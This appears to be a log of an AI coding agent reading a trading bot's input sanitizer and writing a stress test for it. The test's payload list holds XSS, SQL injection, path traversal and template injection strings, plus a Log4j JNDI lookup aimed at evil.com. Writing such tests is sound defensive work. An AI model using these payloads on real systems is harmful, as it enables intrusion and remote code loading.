{"type":"message","id":"f1b7f9ea","parentId":"6d4e23fe","timestamp":"2026-02-17T19:26:50.334Z","message":{"role":"assistant","content":[{"type":"thinking","thinking":"**Analyzing Component Files**\n\nI've just confirmed the existence of key files. I located `src/core/security.py`, which is a good sign. Also, `scripts/log_compressor.py` appears present, along with what looks like a fleet stress test, located at `src/stress_test_shm.py`. I'm starting to build out a picture of the architecture.\n\n\n**Reviewing Security Implementation**\n\nI'm now fully immersed in the `src/core/security.py` file, identifying the `SecurityManager` class and its critical methods. I'm focusing on those methods to understand their behavior and plan for the `storm_security.py` script. The goal is to craft a stress test that effectively exercises the security mechanisms.\n\n\n"},{"type":"toolCall","id":"read_1771356410213_123","name":"read","arguments":{"file_path":"src/core/security.py"},"thoughtSignature":""}],"api":"google-vertex","provider":"google-vertex","model":"gemini-3-pro-preview","usage":{"input":114065,"output":217,"cacheRead":69780,"cacheWrite":0,"totalTokens":114282,"cost":{"input":0.22813,"output":0.002604,"cacheRead":0.013956000000000001,"cacheWrite":0,"total":0.24469}},"stopReason":"toolUse","timestamp":1771356391154}}
{"type":"message","id":"172ce6c7","parentId":"f1b7f9ea","timestamp":"2026-02-17T19:26:50.351Z","message":{"role":"toolResult","toolCallId":"read_1771356410213_123","toolName":"read","content":[{"type":"text","text":"import re\nfrom decimal import Decimal\n\nclass SecurityException(Exception):\n    pass\n\nclass Sanitizer:\n    @staticmethod\n    def clean_item_name(name: str) -> str:\n        \"\"\"\n        Sanitizes item names to allow only alphanumeric, spaces, pipes, hyphens, and parentheses.\n        Removes potentially dangerous characters.\n        \"\"\"\n        if not name:\n            return \"\"\n        # Allow a-z, A-Z, 0-9, whitespace, |, -, (, )\n        cleaned = re.sub(r\"[^a-zA-Z0-9\\s\\|\\-\\(\\)]\", \"\", name)\n        return cleaned.strip()\n\nclass TradeValidator:\n    @staticmethod\n    def validate_buy(price: float | Decimal, avg_price: float | Decimal, balance: float | Decimal) -> bool:\n        \"\"\"\n        Validates a buy order against safety thresholds.\n        Raises SecurityException if validation fails.\n        \"\"\"\n        price = Decimal(str(price))\n        avg_price = Decimal(str(avg_price))\n        balance = Decimal(str(balance))\n\n        # Check 1: Price deviation (max 5% above average)\n        if price > avg_price * Decimal(\"1.05\"):\n            raise SecurityException(f\"Price {price} exceeds limit (1.05 * {avg_price})\")\n\n        # Check 2: Balance exposure (max 10% of total balance per trade)\n        if price > balance * Decimal(\"0.10\"):\n            raise SecurityException(f\"Price {price} exceeds balance exposure limit (0.10 * {balance})\")\n\n        return True\n"}],"isError":false,"timestamp":1771356410349}}
{"type":"message","id":"a23f04cb","parentId":"172ce6c7","timestamp":"2026-02-17T19:27:13.347Z","message":{"role":"assistant","content":[{"type":"thinking","thinking":"**Defining the Approach**\n\nI've just pinpointed the `Sanitizer.clean_item_name` function within `src/core/security.py`. My next move involves scripting with `scripts/storm_security.py`. I'll start by importing the `Sanitizer`. Then, I'll generate a suite of test strings, including valid and malicious names, to check sanitization effectiveness.\n\n\n**Outlining the Execution**\n\nI'm now fully immersed in the script's creation. The initial steps involve importing the `Sanitizer` and preparing a comprehensive set of strings: valid examples and those designed to test vulnerabilities. I plan to feed these strings through the `clean_item_name` function, carefully monitoring for dangerous characters that might slip through the sanitization process. Furthermore, I will measure processing time for an efficiency assessment.\n\n\n"},{"type":"toolCall","id":"write_1771356433341_124","name":"write","arguments":{"file_path":"scripts/storm_security.py","content":"import time\nimport sys\nimport os\nimport random\nimport string\n\n# Add src to path\nsys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))\n\nfrom core.security import Sanitizer\n\ndef generate_storm_data(count=10000):\n    valid_chars = string.ascii_letters + string.digits + \" |()- \"\n    injection_payloads = [\n        \"<script>alert(1)</script>\",\n        \"DROP TABLE users;\",\n        \"../../etc/passwd\",\n        \"javascript:void(0)\",\n        \"1 OR 1=1\",\n        \"{{7*7}}\",  # SSTI\n        \"${jndi:ldap://evil.com/a}\", # Log4j\n    ]\n    \n    data = []\n    for _ in range(count):\n        if random.random() < 0.8: # 80% valid\n            length = random.randint(5, 50)\n            item = \"\".join(random.choice(valid_chars) for _ in range(length))\n            data.append(item)\n        else: # 20% injection\n            payload = random.choice(injection_payloads)\n            # Mix payload with some valid chars\n            prefix = \"\".join(random.choice(valid_chars) for _ in range(5))\n            data.append(prefix + payload)\n    return data\n\ndef run_storm():\n    print(\"Generating 10k storm strings...\")\n    dataset = generate_storm_data(10000)\n    \n    print(\"Starting sanitization loop...\")\n    start_time = time.time()\n    \n    failures = []\n    \n    for i, raw_input in enumerate(dataset):\n        sanitized = Sanitizer.clean_item_name(raw_input)\n        \n        # Validation check: Ensure no dangerous chars leaked through\n        forbidden = [\"<\", \">\", \";\", \"/\", \"\\\\\", \"{\", \"}\", \"$\"]\n        for bad_char in forbidden:\n            if bad_char in sanitized:\n                failures.append(f\"FAIL: Input '{raw_input}' -> '{sanitized}' contains '{bad_char}'\")\n                break\n                \n    end_time = time.time()\n    total_time = end_time - start_time\n    latency_per_op = (total_time / len(dataset)) * 1000 # ms\n    \n    print(f\"Processed {len(dataset)} items in {total_time:.4f}s\")\n    print(f\"Latency: {latency_per_op:.4f} ms/op\")\n    \n    if failures:\n        print(f\"\\nCRITICAL SECURITY FAILURES ({len(failures)}):\")\n        for f in failures[:5]:\n            print(f)\n        if len(failures) > 5:\n            print(f\"... and {len(failures) - 5} more.\")\n        sys.exit(1)\n    else:\n        print(\"\\nSUCCESS: No injections passed sanitization.\")\n\nif __name__ == \"__main__\":\n    run_storm()\n"},"thoughtSignature":""}],"api":"google-vertex","provider":"google-vertex","model":"gemini-3-pro-preview","usage":{"input":114614,"output":918,"cacheRead":0,"cacheWrite":0,"totalTokens":115532,"cost":{"input":0.229228,"output":0.011016,"cacheRead":0,"cacheWrite":0,"total":0.24024399999999999}},"stopReason":"toolUse","timestamp":1771356410352}}
